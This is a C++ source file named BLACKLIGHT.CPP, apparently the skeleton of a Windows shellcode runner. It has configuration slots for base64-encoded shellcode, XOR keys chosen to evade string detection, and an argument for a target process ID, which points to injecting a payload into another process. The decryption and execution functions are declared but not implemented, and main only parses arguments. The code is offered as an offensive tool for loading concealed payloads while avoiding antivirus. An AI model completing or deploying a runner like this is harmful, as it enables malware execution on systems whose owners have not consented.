// BLACKLIGHT.CPP
#include <Windows.h>
#include "base64.h"
#include <iostream>
#include <cstring>
#include <string>

using std::string;
using std::cout;
using std::endl;

// PROTOTYPES
unsigned char* decryptKey(unsigned char*, size_t);
unsigned char* decryptXOR(unsigned char*, size_t);
void run(unsigned char*, size_t);

// GLOBALS
DWORD TARGET_PID;
BOOL DEBUG_MODE = false;

///////////////////////////////////////////////////////////////////////////////////////
// RUNNER CONFIG
///////////////////////////////////////////////////////////////////////////////////////

// TODO: PUT YOUR SC HERE
const string ENCODED_SC = "";

// TODO: IF USING BYTEWISE XOR, PUT KEY HERE IN DECIMAL OR HEX
const unsigned char BYTEWISE_XOR_KEY = 77;

// TODO: IF USING THE XOR KEY ENCRYPTION, CONFIG KEY AND LENGTH HERE.
// NOTE: DO NOT INCLUDE NULL BYTE (PREVENT STRING DETECTION) IN EITHER THE ARRAY OR IN THE LENGTH
const unsigned char XOR_KEY_STR[] = { 'S', 't', 'o', 'r', 'm', 'F', 'a', 'l', 'l' };
const size_t XOR_KEY_STR_LEN = 9;

///////////////////////////////////////////////////////////////////////////////////////
// RUNNER CODE
///////////////////////////////////////////////////////////////////////////////////////

int main(int argc, char** argv) {
	cout << "Hello, world" << endl;

	// ARGUMENTS
	// 1: TARGET PID
	// 2: DEBUG MODE

	if (argc < 2) {
		cout << "Invalid arguments, specify PID!" << endl;
		exit(1);
	}
	else if (argc == 2) {
		DEBUG_MODE = false;
		TARGET_PID = atoi(argv[1]);

	}
	else if (argc == 3) {
		DEBUG_MODE = true;
		TARGET_PID = atoi(argv[1]);
	}


}